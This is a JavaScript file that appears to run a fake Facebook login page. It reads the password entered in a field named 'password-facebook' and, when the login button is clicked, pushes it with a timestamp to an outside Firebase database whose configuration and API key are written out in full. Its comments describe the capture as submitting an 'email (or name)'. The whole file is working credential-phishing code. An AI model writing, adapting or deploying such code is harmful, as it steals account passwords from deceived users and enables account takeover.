// Initialize Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference to the input field and error message elements
var inputField = document.getElementById('password-facebook');
var errorMessage = document.getElementById('error-message');
var loginButton = document.getElementById('login-button');
var fadeTimeout;

// Function to show error message
function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.opacity = '1';
    errorMessage.style.visibility = 'visible';
    
    // Clear any existing timeout
    clearTimeout(fadeTimeout);
    
    // Set timeout to fade out the message after 5 seconds
    fadeTimeout = setTimeout(function() {
        hideError();
    }, 5000);
}

// Function to hide error message
function hideError() {
    errorMessage.style.opacity = '0';
    errorMessage.style.visibility = 'hidden';
}

// Function to check the validity of input and display error if needed
function checkName(name) {
    if (!name.trim()) {
        showError("Please enter your password");
        return false;
    }
    return true;
}

// Function to submit email (or name) to Firebase
function submitEmail() {
    var name = inputField.value;

    // If input is valid, push the data to Firebase
    if (checkName(name)) {
        firebase.database().ref('Names').push({
            name: name,
            timestamp: new Date().toISOString()
        })
        .then(() => {
            console.log('Data saved successfully');
            hideError();
        })
        .catch((error) => {
            console.error('Error occurred:', error);
            showError('Error occurred while saving data!');
        });
    }
}

// Add event listener to hide the error message when user starts typing
inputField.addEventListener('input', function() {
    hideError();
});

// Add event listener to the login button
loginButton.addEventListener('click', submitEmail);
